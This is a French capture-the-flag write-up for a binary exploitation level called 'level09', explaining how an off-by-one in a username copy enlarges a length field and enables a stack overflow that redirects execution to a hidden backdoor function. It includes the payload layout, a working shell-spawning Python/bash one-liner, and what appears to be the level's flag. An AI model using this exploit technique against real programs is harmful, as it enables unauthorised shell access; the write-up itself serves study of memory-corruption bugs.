# LEVEL09

## **Code**

L’exécutable `level09` ne prend pas d'arguments. Il lis sur `stdin` a deux reprises, pour demander une première fois
un **username**, puis un **message**.

Une fonction est présente mais jamais appelée: `secret_backdoor()`, qui fait un call a `system()`, avec son paramètre. 

La fonction `main()` fait simplement un appel a une fonction `handle_msg()`, qui elle même fait appel aux
fonction `set_username()` et `set_msg()`,après s’être alloué 192 octets sur la stack.

Ces deux fonctions prennent un paramètre, qui sera une structure.

> Pour comprendre que nous avions affaire a une structure, on a remarque que la fonction `set_username`  écrivait le contenu `stdin` dans son paramètre, mais avec un décalage de 140 octets. Aussi, dans `handle_msg()`, on peut constater qu'une partie du buffer alloue est set a 140.


```c
struct buffer {
    char message[140];
    char username[40];
    int message_len;
};
```

Les deux fonction, `set_username()` et `set_msg()`, font strictement la même choses: elle lisent grâce a `fgets()` sur `stdin`, puis écrivent les données lues dans la structure.
Cependant, elles le font différemment. `set_username()` utilise une boucle et écrit octet par octet ce qui est lu, alors que `set_msg()` fait un simple appel a `strncpy()`, avec comme paramètre de taille le `message_len` de la structure.
___
## **Faille**

On a dit que `set_username()` écrivait ce que `fgets()` avait lu bytes par bytes, dans `buffer.username`.
La condition d’arrêt de la boule est que l’itérateur `i` soit plus petit que 41, hors, `username` a une taille de 40. Si l'on rentre 41 octets ici,on va aller écrire sur le premier octet qui suit dans la structure: `message_len`.

On a dit que `set_msg()` écrivait  ce que `fgets()` avait lu via un  appel a `strncpy()`, avec `message_len` comme taille.

En faisant un overflow d'un octet sur `username`, on va pouvoir écrire jusqu’à 256 octets dans `message`, alors ce dernier ne fait que 140.
___
## **Solution**

A partir d'ici, on retrouve un buffer overflow classique, on va override le save de l'EIP dans `handle_msg()`, avec l'adresse de `secret_backdoor()`.
On retrouve le format suivant pour notre exploit:

```
[ 40 * A ][ 0xFF ][ \n ][ 200 * A ][ &secret_backdoor ][ "/bin/sh" ]
```

On rempli le buffer `username`, et on dépasse sur `message_len` avec un octet, que l'on va mettre le plus gros possible, ici `0xff`. 
Maintenant, on peut écrire jusqu’à 256 octets dans `message`. On sait que la structure fait 192. En faisant un dump de la stack a cet endroit, on remarque que le save de l'EIP se trouve 8 octets plus loin. On va donc remplir le buffer avec 200 "A", puis réécrire le save avec l'adresse de `secret_backdoor()`, avec `"/bin/sh"` en paramètre.

```bash
cat <(python -c 'print( "A" * 40 + "\xff" )'  ;   python -c 'print("A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "/bin/sh")') - | ./level09
```

>> j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE